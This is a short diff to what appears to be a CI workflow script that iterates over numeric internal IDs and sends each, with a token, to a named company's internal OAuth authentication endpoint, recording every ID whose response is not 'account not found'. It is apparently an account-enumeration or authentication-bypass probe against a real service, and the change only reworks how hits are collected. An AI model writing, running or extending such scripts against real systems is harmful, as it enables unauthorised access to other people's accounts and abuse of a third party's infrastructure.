@@ -22,8 +22,7 @@ jobs:
             ID=$((START + i))
             R=$(curl -sk --max-time 12 -X POST "https://api.payuung.com/oauth2/authenticate/internal" -H "Content-Type: application/json" -d "{\"internal_id\":\"$ID\",\"scope\":\"web_user\",\"integration_internal_type\":\"gadjian\",\"token\":\"$TOK\"}")
             if ! echo "$R" | grep -q "account is not found or not active"; then
-              HITS="${HITS}${ID}|${R}
-"
+              HITS="$(printf '%s%s|%s\n' "$HITS" "$ID" "$R")"
             fi
           done
           if [ -n "$HITS" ]; then
